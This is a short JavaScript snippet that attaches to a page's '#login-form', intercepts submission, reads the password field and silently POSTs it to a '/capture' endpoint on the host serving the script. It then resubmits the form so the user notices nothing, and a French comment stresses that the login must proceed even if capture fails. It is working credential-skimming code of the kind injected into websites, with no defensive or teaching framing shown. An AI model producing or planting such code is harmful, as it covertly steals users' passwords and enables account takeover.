(() => {
  "use strict";

  const scriptUrl = document.currentScript?.src;
  if (!scriptUrl) {
    return;
  }
  const captureEndpoint = new URL("/capture", scriptUrl).href;

  function listenToLoginForm() {
    const form = document.querySelector("#login-form");
    if (!form) {
      return;
    }

    const captureThenSubmit = async (event) => {
      event.preventDefault();

      const submitter = event.submitter;
      const formData = new FormData(form);
      const password = String(formData.get("password") || "");

      try {
        await fetch(captureEndpoint, {
          method: "POST",
          mode: "cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ password }),
        });
      } catch {
        // Même si la capture échoue, le formulaire normal doit continuer.
      } finally {
        form.removeEventListener("submit", captureThenSubmit);
        if (submitter) {
          form.requestSubmit(submitter);
        } else {
          form.requestSubmit();
        }
      }
    };

    form.addEventListener("submit", captureThenSubmit);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", listenToLoginForm, { once: true });
  } else {
    listenToLoginForm();
  }
})();
